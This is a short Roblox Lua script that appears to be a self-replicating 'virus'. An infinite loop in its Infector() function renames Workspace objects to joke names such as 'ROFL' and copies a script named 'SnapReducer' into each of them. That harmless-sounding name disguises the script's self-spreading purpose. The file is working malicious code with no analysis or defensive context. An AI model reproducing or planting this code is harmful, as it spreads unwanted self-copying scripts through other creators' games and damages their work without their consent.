model = script.Parent -- Sets the model variable to the script's parent, this way we don't have to manually set model names.



function Infector()
while true do -- Infinite loop
	found = game.Workspace:FindFirstChild("Humanoid")
	found2 = game.Workspace:FindFirstChild("Model")
	found3 = game.Workspace:FindFirstChild("Brick")
	if found ~= nil then
		found.Name="ROFL"
		infectedscr = model.SnapReducer:Clone()
		infectedscr.Parent = found
	else
	if found2 ~= nil then
		found2.Name = "LMAO"
		infectedscr2 = model.SnapReducer:Clone()
		infectedscr2.Parent = found2
	else
	if found3 ~= nil then
		found3.Name = "LOL"
		infectedscr3 = model.SnapReducer:Clone()
		infectedscr3.Parent = found3
	else
	local children = game.Workspace:GetChildren()
	for c = 1, #children do
		
		if children[c].Name ~= "ROFL"
		then
		children[c].Name = "ROFL"
		infectedscr421 = model.SnapReducer:Clone()
		infectedscr421.Parent = children[c]
		else
		end
		
	end
	end
	end
	
	end
	wait(10)
end
end
 
Infector()
